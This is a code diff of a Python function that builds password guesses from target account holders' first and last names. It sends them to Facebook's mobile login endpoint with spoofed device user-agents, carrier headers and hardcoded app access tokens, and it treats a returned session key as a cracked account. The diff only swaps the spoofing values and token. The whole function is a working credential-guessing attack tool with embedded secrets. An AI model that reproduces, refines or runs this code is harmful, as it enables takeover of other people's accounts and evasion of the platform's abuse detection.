@@ -9,7 +9,7 @@ def api1(ids,names,passlist,total_ids):
 			ln = fn
 		for pw in passlist:
 			pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
-			accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'                       
+			accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
 			Sim = random.choice(["31002","45204"])
 			Net = random.choice(["31002","45201"])
 			en = random.choice(["en_GB","en_US"])			
@@ -17,7 +17,7 @@ def api1(ids,names,passlist,total_ids):
 			plugin = random.choice([network,"AT&-T","T-Mobile"])
 			random_seed = random.Random()
 			adid = str(''.join(random_seed.choices(string.hexdigits, k=16))) 
-			ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+".0.0."+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=720,height=1184};FBLC/en_US;FBCR/Emergency calls only;FBMF/HUAWEI;FBBD/Huawei;FBPN/com.facebook.katana;FBDV/HUAWEI SCL-L01;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]" 
+			ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+".0.0."+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=4.0,width=1440,height=2560};FBLC/en_US;FBCR/3;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G920F;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]" 
 			head = {
 'User-Agent': ua,
 'Accept-Encoding': 'gzip, deflate',
@@ -27,8 +27,8 @@ def api1(ids,names,passlist,total_ids):
 'Host': 'b-graph.facebook.com',
 'Priority': 'u=3, i',
 'Content-Type': 'application/x-www-form-urlencoded',
-'X-Fb-Sim-Hni': '64301',
-'X-Fb-Net-Hni': '64301',
+'X-Fb-Sim-Hni': '31002',
+'X-Fb-Net-Hni': '31002',
 'X-Fb-Connection-Quality': 'EXCELLENT',
 'Zero-Rated': '0',
 'Authorization': 'OAuth null',
@@ -76,7 +76,7 @@ def api1(ids,names,passlist,total_ids):
 'fb_api_req_friendly_name':'autheticate',
 'fb_api_caller_class':'Fb4aAuthHandler',
 'api_key':'882a8490361da98702bf97a021ddc14d',
-'access_token': accees_token,
+'access_token':'256002347743983%7C374e60f8b9bb6b8cbb30f78030438895',
 'sig':'4c854da0db9429f4913c2a1b221c1d30'}
 			po = requests.post('https://b-graph.facebook.com/auth/login',data=data,headers=head).json()
 			if 'session_key' in po:
